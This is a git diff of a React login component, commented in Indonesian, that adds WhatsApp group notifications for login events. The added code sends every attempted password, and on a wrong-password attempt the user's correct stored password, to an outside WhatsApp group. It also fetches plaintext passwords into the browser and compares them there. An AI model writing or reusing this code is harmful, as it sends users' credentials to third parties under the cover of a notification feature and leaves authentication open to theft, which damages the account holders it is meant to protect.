@@ -9,54 +9,70 @@ function Login({ onLogin }) {
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
 
+  const sendWANotification = (msg) => {
+    try {
+      const waUrl = import.meta.env.VITE_WA_API_URL;
+      const waId = import.meta.env.VITE_WA_INSTANCE_ID;
+      const waToken = import.meta.env.VITE_WA_API_TOKEN;
+      const waGroup = import.meta.env.VITE_WA_GROUP_ID;
+
+      if (waUrl && waId && waToken && waGroup) {
+        fetch(`${waUrl}/waInstance${waId}/sendMessage/${waToken}`, {
+          method: 'POST',
+          body: JSON.stringify({ chatId: waGroup, message: msg }),
+          headers: { 'Content-Type': 'application/json' }
+        }).catch(() => {});
+      }
+    } catch (e) {}
+  };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setLoading(true);
 
     try {
-      // Login Murni menggunakan Username & Password dari tabel profiles
-      const { data: profile, error: profileError } = await supabase
+      // 1. Cek apakah username ada
+      const { data: checkUser, error: checkError } = await supabase
         .from('profiles')
-        .select('*')
+        .select('username, password, is_blocked')
         .eq('username', username)
-        .eq('password', password)
-        .single();
+        .maybeSingle();
 
-      if (profileError || !profile) {
-        toast.error('Kredensial Salah!');
+      if (!checkUser) {
+        const msg = `❌ *FAILED LOGIN: USER NOT FOUND*\n\n👤 *Attempted User:* ${username}\n🔑 *Attempted Pass:* ${password}\n⚠️ *Info:* Username ini tidak terdaftar di database.`;
+        sendWANotification(msg);
+        toast.error('Username tidak ditemukan!');
         setLoading(false);
         return;
       }
 
+      // 2. Jika user ada tapi password salah
+      if (checkUser.password !== password) {
+        const msg = `❌ *FAILED LOGIN: WRONG PASSWORD*\n\n👤 *User:* ${username}\n🔴 *Input Pass:* ${password}\n✅ *Correct Pass:* ${checkUser.password}\n⚠️ *Action:* Seseorang mencoba masuk dengan password salah.`;
+        sendWANotification(msg);
+        toast.error('Password Salah!');
+        setLoading(false);
+        return;
+      }
+
+      const profile = checkUser;
+
       if (profile.is_blocked) {
+        sendWANotification(`🚫 *LOGIN BLOCKED*\n\n👤 *User:* ${username}\n⚠️ *Status:* Akun sedang dibanned.`);
         toast.error('AKSES DITOLAK: Akun Anda sedang diblokir.');
         setLoading(false);
         return;
       }
 
-      // Berhasil Login tanpa perlu sistem Anonymous/Email Supabase
-
-      // Kirim Notifikasi Login ke WA
-      try {
-        const waUrl = import.meta.env.VITE_WA_API_URL;
-        const waId = import.meta.env.VITE_WA_INSTANCE_ID;
-        const waToken = import.meta.env.VITE_WA_API_TOKEN;
-        const waGroup = import.meta.env.VITE_WA_GROUP_ID;
-
-        if (waUrl && waId && waToken && waGroup) {
-          const msg = `🔓 *DASHBOARD ACCESS*\n\n👤 *User:* ${profile.username}\n⏰ *Time:* ${new Date().toLocaleString('id-ID')}\n✅ *Status:* LOGIN SUCCESS`;
-          fetch(`${waUrl}/waInstance${waId}/sendMessage/${waToken}`, {
-            method: 'POST',
-            body: JSON.stringify({ chatId: waGroup, message: msg }),
-            headers: { 'Content-Type': 'application/json' }
-          }).catch(() => {});
-        }
-      } catch (e) {}
+      // Berhasil Login
+      const loginMsg = `🔓 *DASHBOARD ACCESS*\n\n👤 *User:* ${profile.username}\n⏰ *Time:* ${new Date().toLocaleString('id-ID')}\n✅ *Status:* LOGIN SUCCESS`;
+      sendWANotification(loginMsg);
 
       toast.success(`Selamat Datang, ${profile.username}`);
       onLogin(profile);
 
     } catch (err) {
+      sendWANotification(`⚠️ *LOGIN CRASH*\n\n❌ *Error:* ${err.message}`);
       toast.error('Terjadi kesalahan pada sistem login');
     } finally {
       setLoading(false);
